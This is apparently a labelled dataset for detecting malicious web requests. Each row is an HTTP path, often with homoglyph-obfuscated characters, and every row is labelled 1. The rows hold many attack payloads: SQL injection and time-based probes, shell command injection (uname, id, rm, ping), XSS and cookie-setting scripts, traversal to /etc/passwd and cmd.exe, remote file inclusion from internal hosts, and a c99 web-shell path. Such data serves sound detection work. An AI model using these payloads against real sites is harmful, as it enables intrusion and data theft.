sentences 	 labels
/ 𝗌𝒕ring / strings / parameters = &  # 0062  	 1
/ 𝙝𝗲lp . php ? q =  "  ; uname \ x09 > q51344488 \ x09 #  	 1
/ 𑣁𝒕ring / strings / parameters = 1 "  "  )  )  )  ; call regexp_substring ( repeat ( right ( char ( 2385 )  , 0 )  , 500000000 )  , null )  --  	 1
/ ѕ𝗍ring / strings / parameters = 1 "  "  )  )  )  and elt ( 1210 = 1210 , sleep ( 5 )  )  and  (  (  (  "  " ilge "  "  like  "  " ilge  	 1
/ 𝘴𝓉ring / strings / parameters = < svg xmlns =  " http :  /  / www . w3 . org / 2000 / svg "  >  < a xmlns : xlink =  " http :  /  / www . w3 . org / 1999 / xlink "  xlink : href =  " javascript : alert ( 1 )  "  >  < rect width =  " 1000 "  height =  " 1000 "  fill =  " white "  /  >  <  / a >  <  / svg >  	 1
/ m𝖺𝔦n . php ? stuff =  " del \ x0bq67582951 & rem \ x0b  	 1
/ 𝐬𝐭ring / str =  $  ( echo fnslec )   str1 =  $  {  # str }   if  [  6 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  |  	 1
/ 𝖾⤬amples / jsp / jsp2 / jspx / anacondaclip . pl ? template =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 1
/ 𝖼ommℯnts . php ? scriptpath = http :  /  / 192 . 168 . 202 . 96 : 8080 / frznctvhi0i5 ?  ?  	 1
/ m𝓪𝕚n . php ? logout = ping ; -w ; 10000 ; -n ; 1 ; 1 . 2 . 3 . 4 | rem ;  	 1
/ 𐑈𝕥ring / strings / parameters = 1 ,  ' 0 '  )  ; waitfor delay  ' 0 : 0 : 50 ;  --  	 1
/ 𝖆ԁministrator / components / com_feederator / includes / tmsp / subscription . php ? globals [ mosconfig_absolute_path ]  = http :  /  / 192 . 168 . 202 . 96 : 8080 / 4dckqcc0acprbz ?  	 1
/ аoꝚ2ww7y . cgi ?  < script > document . cookie =  " testqppc = 8767 ;  "  <  / script >  	 1
/ 𝚊𝑤stats / awstats . pl ? migrate =  | echo ;  /  .  / tmp / wgwvwkorhp . sh ; echo | awstats540737 . txt  	 1
/ 𝖻𝟻xdqgz2 . cfm ?  < script > cross_site_scripting . nasl <  / script >  	 1
/ 𝓽o𝓅 . php ? stuff =  "  & ver \ x0b > q54461117 & rem \ x0b  	 1
/ 𝟑j𐌚echh0 . php3 ?  < meta http-equiv = set-cookie content =  " testfuqi = 4189 "  >  	 1
/ 𝘷j𝖇rrppi . kspx ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ 𝘀𝙩ring / strings / parameters = '  &  sleep 0  &  &  str =  $  ( echo dkkeqz )   &  &  str1 =  $  {  # str }   &  &   [  7 -eq  $  { str1 }   ]   &  &  sleep 1  &  	 1
/ jɑ𝙫ascript / recorder . exe  	 1
/ 𝖼𝚐i-bin / visadmin . exe  	 1
/ ƽ𝔱ring / strings / parameters = echo injqrh $  (  ( 6 + 71 )  )  $  ( echo injqrh ) injqrh '  	 1
/ ѕ𝘵ring / strings / parameters = "  ;  str =  $  ( echo baksin )  ;  str1 =  $  {  # str }  ;  if  [  9 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  "  	 1
/ ꜱ𝘁ring / strings / parameters = "  &  & echo $ ifswpyoyt $  (  ( 86 + 46 )  )  $  ( echo $ ifswpyoyt ) wpyoyt /  /  	 1
/ 𝓬𝙖cti / sawmill6cl . exe ? ho +  { complete_version }  	 1
/ 𝖘𝚝ring / strings / parameters = < script a =  `  >  `  src =  "  " http :  /  / vulnerability-lab . com / crosssitescripting . js "  "  >  <  / script >  	 1
/ nm𝘄𝟬do67 . mscgi ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ 𝓈𝙩ring / strings / parameters = ? x =  	 1
/ ⅇn-𝕦s / account / man-cgi ? section = 0 & topic = ls ; id  	 1
/ 𝔠𝑎cti / supporter / tupdate . php ? groupid = change & sg =  '  	 1
/ 𝒔𝚝ring / strings / parameters = 1 %  "  "  )  )  and  ( 3020 = 3020 )  * 6703 and  (  (  "  "  %  "  "  =  "  "  	 1
/ 𝒕𝖊mplates / tmpl_dfl / scripts / index . php ? dir [ inc ]  = http :  /  / 192 . 168 . 202 . 118 : 8080 / zz5thkvtmlgl ?  	 1
/ 𑣁𝓽ring / strings / parameters = 1 '  where 1045 = 1045 or 6793 =  ( select 6793 from pg_sleep ( 5 )  )  --  	 1
/ 𝓈𝙩ring / strings / parameters = 1 %  '  )  order by 1 --  	 1
/ 𝓼ⅽripts / event_view . php ? eid = 34 union select 294969347  	 1
/ 𝔢𝓍amples / jsp / colors / inc / functions . inc . php ? config [ ppa_root_path ]  =  / etc / passwd \ x00  	 1
/ 𝘀ℹte /  '  union all select filetoclob (  '  / etc / passwd '  ,  ' server '  )  :  : html , 0 from sysusers where username  =  user  --  /  . html  	 1
/ 𐑈𝘁ring / modo = registro & login = percy & password =  '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  & nombre = pars & apellidos = corral + rahal & email = healy @ ajedrezconmaestros . ch & dni = 15756299b & direccion = carrer + verge + de + l ' alba ,  + s / n +  & ciudad = san + morales & cp = 15338 & provincia = len & ntc = 8682803216185712 & b1 = registrar  	 1
/ 𝖻l𝟪sefdm . php ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ 𑣁𝐭ring / strings / parameters = 1 "  "  where 1852 = 1852 union all select null , null , null , null , null , null , null , null , null #  	 1
/ 𝐬𝕥ring / strings / parameters = "  + if ( benchmark ( 3000000 , md5 ( 1 )  )  , null , null )  , null , null , null , null )   #  	 1
/ 𝔰𝗍ring / strings / parameters = \ nnetstat -a %  \ n  	 1
/ 𝓭еfault . asp ? catid = 1234567890 '  	 1
/ ҽnꓒer ' s_game /  	 1
/ 𝒔𝘵ring / strings / parameters = < layer src =  "  " javascript : document . cookie = true ;  "  "  >  <  / layer >  	 1
/ 𝔠𝓰i-bin / phprint . php ? module = vtiger_lang_crm_lfi . nasl & action = 1331904181 & lang_crm =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  / etc / passwd \ x00  	 1
/ jαⅴascript / aliases . exe  	 1
/ 𐑈𝖙ring / strings / parameters = 1 "  "  )  where 1107 = 1107 and 8189 =  ( select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 )  --  	 1
/ 𝓲𝟟prbs22 . aspx ?  < script > document . cookie =  " testjnre = 7328 ;  "  <  / script >  	 1
/ ɩn𝙙ex . php ? config [  " sipssys "  ]  = http :  /  / 192 . 168 . 202 . 96 : 8080 / 4dckqcc0acprbz ?  	 1
/ ᴄ𝖌i-bin / dcforum . cgi ? az = list & forum =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  	 1
/ 𝗌𝕥ring / strings / parameters = "  |  | echo $ ifsrjobxi $  (  ( 9 + 83 )  )  $  ( echo $ ifsrjobxi ) rjobxi '  	 1
/ 𝐪ꞟagynka . pl ?  < script > cross_site_scripting . nasl <  / script >  	 1
/ 𝔠𝔤i-binsearch_results . dot ? search_query = nessus "  >  < script > alert (  ' dotcms_search_query_xss . nasl '  )  <  / script >  /  	 1
/ ƽ𝓉ring / strings / parameters = echo $ ifslixpwr $  (  ( 69 + 26 )  )  $  ( echo $ ifslixpwr ) lixpwr '  	 1
/ 𝚏α8p8lr8 . aspx ?  < script > cross_site_scripting . nasl <  / script >  	 1
/ 𑣁𝓽ring / strings / parameters = "  , null , null , null , null , null , null , null , null )  waitfor delay  ' 0 : 0 : 20 '   --  	 1
/ ѕ𝖙ring / strings / parameters = 1 "  "  rlike  ( select  *  from  ( select ( sleep ( 5 )  )  ) sgvo )  and  "  " cxsu "  "  like  "  " cxsu  	 1
/ 𝐩𝓱pmyadmin /  /  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \ windows / win . ini  	 1
/ ꞟ𝔰torekeeper . pl ? command = goto & file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 1
/ 𝓯n𑜎hrxyd . php ?  < script > cross_site_scripting . nasl <  / script >  	 1
/ ꜱ𝘵ring / strings / parameters = 1 '  and 7533 = 7533 and  ' clqy '  like  ' clqy  	 1
/ ⅇ𝗑amples / servlets / servlet / texis . exe /  ? -dump  	 1
/ 𝔲νazfs7p . asp ?  < script > document . cookie =  " testwtbo = 4831 ;  "  <  / script >  	 1
/ 𝔦n𝘥ex . php ? open = xxpathxx  	 1
/ 𝑠𝓉ring / strings / parameters = 1 '  where 1093 = 1093 union all select null , null , null , null , null , null , null --  	 1
/ 𑣁𝖙ring / strings / parameters = 1 )  and 9660 =  ( select count (  *  )  from all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 )  --  	 1
/ 𝘀𝒄ript / common . inc . php ? path_inc = http :  /  / 192 . 168 . 202 . 118 : 8080 / moclyxlwqyfjnp ?  	 1
/ 𝖇z𝐮f9ozq . do ?  < script > cross_site_scripting . nasl <  / script >  	 1
/ 𝑠𝑡ring / strings / parameters = &  & echo $ ifsonqkzz $  (  ( 73 + 7 )  )  $  ( echo $ ifsonqkzz ) onqkzz "  	 1
/ 𝘀𝙩ring / strings / parameters = &  sleep 0  &  &  str =  $  ( echo logujr )   &  &  str1 =  $  {  # str }   &  &   [  2 -eq  $  { str1 }   ]   &  &  sleep 1  /  /  	 1
/ j𝗮𝔳ascript / next . exe  	 1
/ 𝖼𝐠i-bin / store . cgi ? startid =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 . html  	 1
/ 𝘵oр . php ? stuff =  '  & rm q28696513  #  	 1
/ 𝙨𝑡ring / strings / parameters = '  ; alert ( string . fromcharcode ( 88 , 83 , 83 )  )  /  /  \  '  ; alert ( string . fromcharcode ( 88 , 83 , 83 )  )  /  /  "  ; alert ( string . fromcharcode ( 88 , 83 , 83 )  )  /  /  \  "  ; alert ( string . fromcharcode ( 88 , 83 , 83 )  )  /  /  >  <  / script >  !  --  < script > alert ( string . fromcharcode ( 88 , 83 , 83 )  )  <  / script >  =  &  {  }  	 1
/ 𝒔𝓉ring / modo = registro & login = mcdavitt & password = brigosa & nombre = agapio '  + and +  ' 1 '  =  ' 1 & apellidos = san + emeterio + farzati & email = roeves @ esbien . kg & dni = 26396263z & direccion = calle + louis + pasteur + 148 ,  + 2 ? g & ciudad = bercimuel & cp = 10129 & provincia = barcelona & ntc = 1686893417722016 & b1 = registrar  	 1
/ 𝕒o𝟐2ww7y . do ?  < script > document . cookie =  " testqppc = 8767 ;  "  <  / script >  	 1
/ 𝗌𝙩ring / strings / parameters = 1 '  )  ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null )  else char ( 76 )  |  | char ( 65 )  |  | char ( 102 )  |  | char ( 72 )  end )  from  ( values ( 0 )  )  )  and  (  ' ggiw '  =  ' ggiw  	 1
/ m𝑎ın . php ? stuff =  " uname  > q22289594  #  	 1
/ еn-ꞟs / hipkz026 . idc ?  < meta http-equiv = set-cookie content =  " testyrbs = 2855 "  >  	 1
/ 𝖘𝑡ring / modo = insertar ?  & precio = 8384 & b1 = confirmar  	 1
/ 𝐬𝓽ring / modo = registro & login = levasseu & password = embarbillado & nombre = zuleika & apellidos = peazco + arreche & email = others @ tetdevelocidad . sz & dni = 91212440y & direccion = c /  + mostoles + 25 ,  + 2c & ciudad = amposta & cp = 1812a & provincia = valencia & ntc = 1675356603176027 & b1 = registrar  	 1
/ 𝘀𝙩ring / strings / parameters = < meta http-equiv = set-cookie content =  " testwldz = 3506 "  >  	 1
/ 𐑈𝒕ring / strings / parameters = 1 '  where 1917 = 1917 or 6979 = like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  --  	 1
/ m🯵١03snj . nsf ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ 𐑈𝑡ring / modo = paros "  + style =  " background : url ( javascript : alert (  ' paros '  )  )  & id = 2 & precio = 587 & b1 = pasar + por + caja  	 1
/ m𝗮𝔦n . php ? stuff =  " ping \ xa0-w \ xa09000 \ xa0-n \ xa01 \ xa04 . 3 . 2 . 1 & rem \ xa0  	 1
/ 𝗁𝒆lp . php ? q =  "  & rm q31935143 & rem  	 1
/ ѕ𝓉ring / strings / parameters = &  & echo $ ifswokocd $  (  ( 20 + 68 )  )  $  ( echo $ ifswokocd ) wokocd '  	 1
/ m𝘢ın . php ? logout =  & ver ,  > q24489971 & rem ,  	 1
/ ꜱ𝖙ring / modo = entrar & login = juni & pwd =  +  & remember = on & b1 = entrar  	 1
/ 𝐬𝗍ring / str =  $  ( echo ivbazq )   str1 =  $  {  # str }   if  [  9 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  &  	 1
/ 𝙚᙮ophpdesk_path / pipe . php ? lang_file = xxpathxx  	 1
/ 𝒔𝒕ring / strings / parameters = |   [  9 -ne  $  ( echo hzzokr  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  &  	 1
/ 𝒽𝕖lp . php ? q =  ' del \ x09q97653798 \ x09 #  	 1
/ 𝗌𝘁ring / modo = registro & login = mckillop & password = margraviato & nombre = leonor & apellidos = pantiga + corredor & email = miranoa @ enla . web & dni = 36674466t & direccion = mencia + calderon ,  + 170 ,  + 13b & ciudad = manzanares + de + rioja & cp = 05427 & provincia = vizcaya '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  & ntc = 7784731967679465 & b1 = registrar  	 1
/ ԁ𑣆ktpmcq . mscgi ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ 𝖊n-𝐮s / 9kr0ih0v . php3 ?  < meta http-equiv = set-cookie content =  " testzgnm = 1183 "  >  	 1
/ 𝑠𝗍ring / strings / parameters = "  &  sleep 0  &  &  str =  $  ( echo ezdzjg )   &  &  str1 =  $  {  # str }   &  &   [  7 -eq  $  { str1 }   ]   &  &  sleep 1  #  	 1
/ 𝚜𝕥ring / strings / parameters = 1 %  '  and make_set ( 8403 = 8403 , 8899 )  and  '  %  '  =  '  	 1
/ 𝙚᙮amples / jsp / jsp2 / jspx / alienform . cgi ? _browser_out =  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  / etc / passwd  	 1
/ 𝖍𝕚pkz026 . exe ?  < script > document . cookie =  " testyrbs = 2855 ;  "  <  / script >  	 1
/ jɑ𝙫ascript / wp . exe  	 1
/ 𝚑𝔢lp . php ? q =  "  ; uname \ x09 > q21654461 \ x09 #  	 1
/ 𝒔𝗍ring / modo = registro & login = saladna & passworda = na6u40476a8in & nombre = amranto & apellidos = enjuanes + corbi & email = tin @ velazquezlarraaga . aw & dni = 09894897k & direccion = c /  + 358 + 180 + 13 ? g & ciudad = sanlcar + de + barrameda & cp = 16118 & provincia = cuenca & ntc = 1923588691952780 & b1 = registrar  	 1
/ 𝘵o𝗽 . php ? stuff =  " ver \ x09 > q19467518 & rem \ x09  	 1
/ ѕ𝖙ring / strings / parameters = < script src = http :  /  / ha . ckers . org / xss . js ?  <  b  >  	 1
/ 𝒔𝑡ring / strings / parameters = < a onmouseover = location = ’javascript : alert ( 1 )  > click  	 1
/ ꜱ𝕥ring / strings / parameters = &  sleep 0  &  &  str =  $  ( echo qeluff )   &  &  str1 =  $  {  # str }   &  &   [  1 -eq  $  { str1 }   ]   &  &  sleep 1  /  /  	 1
/ һ𝘦lp . php ? q =  "  & rm q44114596  #  	 1
/ 𝗌𝑡ring / modo = entrar & login = schlacht & pwd = 43s8a & remember = off /  & b1 = entrar  	 1
/ ԁ𝖊mo / ms-pe02 / catalog . php ? cid = 0 & sid =  '  "  & sortfield = title & sortorder = asc & pagenumber = 1 & main = http :  /  / 192 . 168 . 202 . 118 : 8080 / iroy1gvqrrqu ?  &  	 1
/ 𝘴𝙩ring / strings / parameters = " xss ' cx <  / img  	 1
/ 𝘴𝓉ring / strings / parameters = 1 %  '  ; select  ( case when  ( 3677 = 2193 )  then 3677 else 1 /  ( select 0 )  end )  --  	 1
/ ℯ𝔵change /  .  .  \ xc1 \ xc1 .  .  \ xc1 \ xc1 .  .  \ xc1 \ xc1 .  .  \ xc1 \ xc1 .  .  \ xc1 \ xc1 .  .  / winnt / system32 / cmd . exe ?  / c + dir + c :  \  +  / og  	 1
/ 𝚜𝙩ring / strings / parameters = 1 %  '  )  )  union all select null , null , null , null , null , null , null , null , null , null --  	 1
/ ℮ℊaet53a . nsf ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ ℯn-𝓾s /  < script > cross_site_scripting . nasl <  / script >  . fts  	 1
/ 𝙨𝓉ring / modo = entrar & login = weatherl4 & pwd = vinazo & remember = on & b1 =  |  	 1
/ ᑲm𝒆un223 . jspa ?  < script > document . cookie =  " testhhwu = 7044 ;  "  <  / script >  	 1
/ 𝓼𝖙ring / strings / parameters = a )  | id ;  	 1
/ 𝔰𝐭ring / str =  $  ( echo spzwvr )   str1 =  $  {  # str }   if  [  9 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  &  	 1
/ 𝒔𝔱ring / strings / parameters = print (  ` echo okejjb echo  $  (  ( 46 + 60 )  )  echo okejjb echo okejjb `  )  ; okejjb  	 1
/ 𝓼𝖙ring / strings / parameters = 1 )  where 7815 = 7815 union all select null , null , null , null , null , null , null #  	 1
/  .  .  \  .  .  \  \  .  .  \  .  .  \  \  .  .  \  .  .  \  \  { file }  	 1
/ 𝓈𝘁ring / strings / parameters = "  & echo $ ifsocygaq $  (  ( 67 + 93 )  )  $  ( echo $ ifsocygaq ) ocygaq |  	 1
/ 𝗌𝘁ring / strings / parameters = 1 "  "  union all select null #  	 1
/ 𝐬𝔱ring / modo = entrar & login = levon & pwd = caucela & remember = off /  & b1 = entrar  	 1
/ 𝗌𝔱ring / strings / parameters = |  | echo heyzba $  (  ( 8 + 23 )  )  $  ( echo heyzba ) heyzba '  	 1
/ 𝘴𝖙ring / id = 2 & nombre = any ?  set-cookie :  + tamper = 5765205567234876235 & precio = 39 & cantidad = 75 & b1 = aadir + al + carrito  	 1
/ 𝑠𝚝ring / errormsg = credenciales + incorrectas '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  	 1
/ 𝖘𝒕ring / strings / parameters = 1 '  |  |  ( select  ' lzvb '  where 1637 = 1637 union all select null , null , null , null , null , null , null , null #  	 1
/ 𝕤ҽarch / index . cfm ?  < script > alert (  \  " vulnerable \  "  )  <  / script >  	 1
/ zm∨գ66jy . aspx ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ 𝓈𝙩ring / id = 1 & nombre = vino +  .  *  ? rioja & precio = 39 & cantidad = 56 & b1 = aadir + al + carrito  	 1
/ 𝘤on𝓽rollers / viewcontroller . php ? basedir = xxpathxx  	 1
/ 𝖘𝘵ring / strings / parameters = 1 "  "  )  )  )  and 4241 = convert ( int ,  ( select char ( 113 )  + char ( 113 )  + char ( 112 )  + char ( 106 )  + char ( 113 )  +  ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end )  )  + char ( 113 )  + char ( 122 )  + char ( 118 )  + char ( 122 )  + char ( 113 )  )  )  and  (  (  (  "  " eoab "  "  like  "  " eoab  	 1
/ ѕ𝑡ring / strings / parameters = 1 '  )  where 6274 = 6274 or 8156 =  ( select count (  *  )  from generate_series ( 1 , 5000000 )  )  --  	 1
/ 𝓼𝔱ring / strings / parameters = -1 < body background =  "  " javascript : document . cookie = true ;  "  "  >  	 1
/ 𝕤𝕥ring / modo = registro & login = gi /  ? l & password = ente + 6a7 & nombre = serveriana & apellidos = santander + bohorquez & email = rundle4 @ eurograb . ma & dni = 09116322l & direccion = calle + trebedes + 157 ,  +  & ciudad = fasnia & cp = 02270 & provincia = ciudad + real & ntc = 1078977887269273 & b1 = registrar  	 1
/ ꜱ𝓉ring / strings / parameters = & echo jygqcn $  (  ( 44 + 48 )  )  $  ( echo jygqcn ) jygqcn \  	 1
/ 𝓼𝖙ring / strings / parameters = < form formaction = popup = 1 ;  onclick = popup = 1 ;  >  < object >  	 1
/ 𝐬𝖙ring / strings / parameters = "  ;  str =  $  ( echo uyjmim )  ;  str1 =  $  {  # str }  ;  if  [  1 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  /  /  	 1
/ ѵ𝚑zmaia2 . asp ?  < meta http-equiv = set-cookie content =  " testkogj = 3979 "  >  	 1
/ 𝗵𝖾lp . php ? q =  "  \ x0duname  > q43695626  #  	 1
/ 𝙨𝔱ring / strings / parameters = 1 '  )  )  and  ( 3020 = 3020 )  * 6703 and  (  (  ' pfal '  =  ' pfal  	 1
/ 𐑈𝕥ring / strings / parameters = "  ;  str =  $  ( echo zwbbrm )  ;  str1 =  $  {  # str }  ;  if  [  9 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  |  	 1
/ ѕ𝗍ring / str =  $  ( echo fnslec )   str1 =  $  {  # str }   if  [  3 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  |  	 1
/ 𝔢𝘅amples / jsp / cal / protection . php ? action = logout & siteurl =  / etc / passwd  	 1
/ mɑ𝙞n . php ? stuff =  " rm \ x09q84368944 \ x09 #  	 1
/ 𝓼𝒕ring / strings / parameters = &  # 00 ;  <  / form >  < input type &  # 61 ;  " date "  onfocus =  " alert ( 1 )  "  >  	 1
/ 𝖞𝔳er8r9o . kspx ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ 𝘴𝖙ring / strings / parameters = "  & echo $ ifsqovijm $  (  ( 98 + 90 )  )  $  ( echo $ ifsqovijm ) qovijm /  /  	 1
/ 𝙨𝔱ring / strings / parameters = 1 "  "  )  )  as jsdc where 2748 = 2748 ; select  ( case when  ( 4660 = 4660 )  then 4660 else cast ( 1 as int )  /  ( select 0 from dual )  end )  from dual --  	 1
/ 𝘱𝒽print . php ? module = vtiger_lang_crm_lfi . nasl & action = 1331919142 & lang_crm =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  / boot . ini \ x00  	 1
/ 𝒂o𝟐2ww7y . exe ?  < meta http-equiv = set-cookie content =  " testqppc = 8767 "  >  	 1
/ 𝘀𝔱ring / strings / parameters = &  # 00 ;  <  / form >  < input type &  # 61 ;  " date "  onfocus =  " confirm ( 1 )  "  >  	 1
/ m𝔞𝚒n . php ? stuff =  "  ; del q85142671  #  	 1
/ jαⅴascript / dumps . exe  	 1
/ ԝℯbdav / c99 . php ? act = f & f = xampp_stop . exe & d = c :  \ xampp &  	 1
/ 𝒕o𝕡 . php ? stuff =  "  & ping \ xa0-w \ xa09000 \ xa0-n \ xa01 \ xa04 . 3 . 2 . 1 & rem \ xa0  	 1
/ 𝑠𝗍ring / strings / parameters = 1 "  "  )  and 5556 =  ( select count (  *  )  from all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 )  and  (  "  " dppw "  "  like  "  " dppw  	 1
/ 𝓈𝘁ring / strings / parameters = -2284 %  "  "  )  )  or 9323 = 9323 #  	 1
/ 𝓅Ο43snfr . mscgi ?  < script > cross_site_scripting . nasl <  / script >  	 1
/ jα𝒗ascript / my . exe  	 1
/ 𝙨𝐭ring / strings / parameters = -3505 "  "  )  or 5290 = 3436 --  	 1
/ o𝟲𝖾bbirj . x ?  < script > cross_site_scripting . nasl <  / script >  	 1
/ 𝖌lo𝖻al . php ? abs_path = xxpathxx ?  	 1
/ 𝕣𝚎cordings / popup . php ? include_path =  / etc / passwd \ x00  	 1
/ 𝕤𝐭ring / strings / parameters = -9156 '  )  )  union all select 9110 , 9110 , 9110 , 9110 #  	 1
/ 𝒆хamples / servlets / servlet / awstatstotals . php ? sort =  {  $  { phpinfo (  )  }  }  {  $  { exit (  )  }  }  	 1
/ 𝗌𝗍ring / strings / parameters = 1 '  )  or exp (  ~  ( select  *  from  ( select concat ( 0x7171706a71 ,  ( select  ( elt ( 6270 = 6270 , 1 )  )  )  , 0x717a767a71 , 0x78 )  ) x )  )  and  (  ' nopu '  =  ' nopu  	 1
/ 𝖘𝑡ring / modo = registro & login = winny & password = centillero & nombre = zoa & apellidos = antonioli + blanc & email = gonard . guercio @ cincocolores . va & dni = 25815583s & direccion = fincas + adjuntas + 15 +  & ciudad = canal + de + berdn & cp = 4913a & provincia = la + rioja & ntc = 6959722794885758 & b1 = registrar  	 1
/ 𝑠𝒕ring / strings / parameters = < div style =  " width :  expression ( confirm ( 5 )  )  ;  "  >  	 1
/ 𝗌𝓉ring / strings / parameters = '  . print (  ` echo pfjgqm echo  $  (  ( 86 + 33 )  )  echo pfjgqm echo pfjgqm `  )  ;  )  } pfjgqm  	 1
/ 𝐬𝑡ring / strings / parameters = &  & echo $ ifsrirrvg $  (  ( 43 + 47 )  )  $  ( echo $ ifsrirrvg ) rirrvg  	 1
/ 𝙩o𝒑 . php ? stuff =  " ping \ xa0-w \ xa09000 \ xa0-n \ xa01 \ xa04 . 3 . 2 . 1 | rem \ xa0  	 1
/ j𐓒𑣊4qobz . exe ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ 𝒔𝔱ring / modo = insertar |  & precio = 7602 & b1 = confirmar  	 1
/ 𝚜𝘵ring / strings / parameters = )  ;  } print (  ` echo oskstf echo  $  (  ( 2 + 12 )  )  echo oskstf echo oskstf `  )  ;  .  ' oskstf  	 1
/ 𝙩oρ . php ? stuff =  "  \ x0auname  > q15138829  #  	 1
/ 𝕤𝔱ring / strings / parameters = ;  str =  $  ( echo ytwfpg )  ;  str1 =  $  {  # str }  ;  if  [  8 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  /  /  	 1
/ ყ𝘄axntrx . fts ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ o۱zj𝟒u9v . php ?  < meta http-equiv = set-cookie content =  " testabrn = 6368 "  >  	 1
/  .  .  % u2216 .  .  % u2216 .  .  % u2216 .  .  % u2216 .  .  % u2216 .  .  % u2216 .  .  % u2216 .  .  % u2216 { file }  	 1
/ 𝒔𝒕ring / strings / parameters = < img + lowsrc =  " javascript : alert ( 1 )  ;  "  >  	 1
/ 𝙨𝔱ring / strings / parameters = '  ; echo drgcti $  (  ( 40 + 71 )  )  $  ( echo drgcti ) drgcti /  /  	 1
/ 𝔢хamples / jsp / sessions / athenareg . php ? pass =   ; id  	 1
/ 𝗌𝗍ring / id = 3 /  & nombre = queso + manchego & precio = 39 & cantidad = 45 & b1 = aadir + al + carrito  	 1
/ 𝔰𝗰ripts / webmail . exe  	 1
/ m𝙖n𝘢ger / session / login . php ? dest = nessus "  >  < script > alert (  ' ossim_dest_xss . nasl '  )  <  / script >  <  !  --  	 1
/ ꭈ𝘦moval_tool . exe /  	 1
